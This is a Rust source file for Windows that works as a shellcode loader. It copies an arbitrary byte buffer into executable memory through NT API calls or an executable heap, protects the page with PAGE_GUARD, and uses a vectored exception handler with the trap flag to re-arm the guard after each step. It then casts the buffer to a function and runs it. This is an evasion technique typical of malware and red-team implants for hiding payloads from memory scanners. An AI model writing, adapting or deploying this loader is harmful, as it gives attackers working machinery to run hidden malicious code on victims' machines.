use std::intrinsics::transmute;
use std::ptr::null_mut;
use std::ptr::copy;
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory};
use ntapi::ntpsapi::NtCurrentProcess;
use ntapi::ntrtl::{RtlAllocateHeap, RtlCreateHeap};
use winapi::ctypes::c_void;
use winapi::shared::minwindef::LPVOID;
use winapi::shared::ntdef::NT_SUCCESS;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::memoryapi::VirtualQuery;
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::errhandlingapi::AddVectoredExceptionHandler;
use winapi::um::winnt::{PAGE_GUARD, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MEMORY_BASIC_INFORMATION, PAGE_READWRITE, EXCEPTION_POINTERS, LONG, MEM_COMMIT};
use winapi::um::minwinbase::{EXCEPTION_GUARD_PAGE, EXCEPTION_SINGLE_STEP};
use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH};

static mut GLOBAL_PAGE: LPVOID = null_mut();

fn page_guard_memory(page: LPVOID) {
    let mut mbi = MEMORY_BASIC_INFORMATION {
        BaseAddress: null_mut(),
        AllocationBase: null_mut(),
        AllocationProtect: 0,
        RegionSize: 0,
        State: 0,
        Protect: 0,
        Type: 0,
    };


    unsafe {
        if VirtualQuery(page, &mut mbi, size_of::<MEMORY_BASIC_INFORMATION>()) == 0 {
            eprintln!("VirtualQuery failed. Error: {}", GetLastError());
            return;
        }

        let mut old_protect = mbi.Protect;

        // 设置页面保护为guarded
        let new_protect = if old_protect == PAGE_READWRITE || old_protect == PAGE_EXECUTE_READWRITE {
            old_protect | PAGE_GUARD
        } else {
            eprintln!("Page is not read/write, cannot set guard.");
            return;
        };

        // 尝试修改页面保护属性
        if VirtualProtect(mbi.BaseAddress, mbi.RegionSize, new_protect, &mut old_protect) == 0 {
            eprintln!("VirtualProtect failed. Error: {}", GetLastError());
            return;
        }
        println!("Page is now guarded.");
    }
}

fn un_page_guard_memory(page: LPVOID) {
    let mut mbi = MEMORY_BASIC_INFORMATION {
        BaseAddress: null_mut(),
        AllocationBase: null_mut(),
        AllocationProtect: 0,
        RegionSize: 0,
        State: 0,
        Protect: 0,
        Type: 0,
    };

    unsafe {
        if VirtualQuery(page, &mut mbi, size_of::<MEMORY_BASIC_INFORMATION>()) == 0 {
            eprintln!("VirtualQuery failed. Error: {}", GetLastError());
            return;
        }

        let mut old_protect = mbi.Protect;

        // 检查页面保护是否包含guarded
        if old_protect & PAGE_GUARD == PAGE_GUARD {
            // 移除guarded标志
            let new_protect = old_protect & !PAGE_GUARD;

            // 尝试修改页面保护属性
            if VirtualProtect(mbi.BaseAddress, mbi.RegionSize, new_protect, &mut old_protect) == 0 {
                eprintln!("VirtualProtect failed. Error: {}", GetLastError());
                return;
            }

            println!("Page guard is now removed.");
        } else {
            println!("Page is not guarded.");
        }
    }
}

unsafe extern "system" fn vectored_exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let exception_pointers = &*exception_info;
    let exception_record = &*exception_pointers.ExceptionRecord;

    if exception_record.ExceptionCode == EXCEPTION_GUARD_PAGE {
        let context_record = &mut *exception_pointers.ContextRecord;
        context_record.EFlags |= 0x100;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if exception_record.ExceptionCode == EXCEPTION_SINGLE_STEP {
        page_guard_memory(GLOBAL_PAGE);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    EXCEPTION_CONTINUE_EXECUTION
}

unsafe fn init_veh() {
    let exception_handler_handle = AddVectoredExceptionHandler(1, Some(vectored_exception_handler));
    if exception_handler_handle.is_null() {
        eprintln!("AddVectoredExceptionHandler failed. Error: {}", GetLastError());
        return;
    }
}

unsafe fn nt_alloc(mut buf: Vec<u8>) {
    let mut allocator: *mut c_void = null_mut();
    let mut size: usize = buf.len();
    let alloc_status = NtAllocateVirtualMemory(NtCurrentProcess, &mut allocator, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if !NT_SUCCESS(alloc_status) {
        panic!("Error allocating memory to the local process: {}", alloc_status);
    }

    let mut bytes_written = 0;
    let buffer = buf.as_mut_ptr() as *mut c_void;
    let mut buffer_length = buf.len();
    let write_status = NtWriteVirtualMemory(NtCurrentProcess, allocator, buffer, buffer_length, &mut bytes_written);
    if !NT_SUCCESS(write_status) {
        panic!("Error writing to the local process: {}", write_status);
    }

    let mut old_perms = PAGE_READWRITE;
    let protect_status = NtProtectVirtualMemory(NtCurrentProcess, &mut allocator, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
    if !NT_SUCCESS(protect_status) {
        panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
    }
    GLOBAL_PAGE = allocator as LPVOID;
}

unsafe fn nt_heap_alloc(buf: Vec<u8>) {
    let handle = RtlCreateHeap(0x00040000 | 0x00000002, null_mut(), buf.len(), buf.len(), null_mut(), null_mut());
    let alloc = RtlAllocateHeap(handle, 0x00000008, buf.len());
    if alloc.is_null() {
        eprintln!("Memory allocation failed");
    }
    copy(buf.as_ptr(), alloc as *mut u8, buf.len());
    GLOBAL_PAGE = alloc;
}

pub(crate) unsafe fn veh_page_hook(buf: Vec<u8>) {
    init_veh();
    nt_heap_alloc(buf);
    page_guard_memory(GLOBAL_PAGE);
    let exec = transmute::<*mut c_void, fn()>(GLOBAL_PAGE);
    exec();
}